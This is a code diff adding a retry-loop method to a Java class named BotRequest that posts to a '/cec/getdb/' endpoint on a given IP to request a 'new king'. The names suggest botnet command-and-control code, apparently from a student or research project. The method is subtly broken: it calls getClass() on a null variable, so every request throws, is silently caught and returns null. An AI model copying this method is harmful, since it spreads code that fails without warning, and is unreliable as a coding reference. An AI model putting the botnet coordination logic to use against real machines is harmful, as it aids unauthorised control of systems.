@@ -25,6 +25,7 @@ import org.springframework.web.client.RestTemplate;
 
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
+import cs.sii.model.role.Role;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.crypto.CryptoUtils;
 
@@ -221,6 +222,30 @@ public class BotRequest {
 				}
 			}
 		}
+	}
+	
+	
+	public List<Object> getObject(String ip, Integer i) {
+		List<Object> response = null;
+		Integer count = 0;
+		while (count < REQNUMBER) {
+			try {
+				String url = HTTPS + ip + PORT + "/cec/getdb/";
+				System.out.println("request new king: " + i);
+				response = restTemplate.postForObject(url, i, response.getClass());
+				return response;
+			} catch (Exception e) {
+				// e.printStackTrace();
+				System.out.println("Errore richiesta new king");
+				try {
+					count++;
+					Thread.sleep(WAIT_RANGE);
+				} catch (InterruptedException ex) {
+					ex.printStackTrace();
+				}
+			}
+		}
+		return response;
 	}
 
 	// da valutare se devono essere asincroni
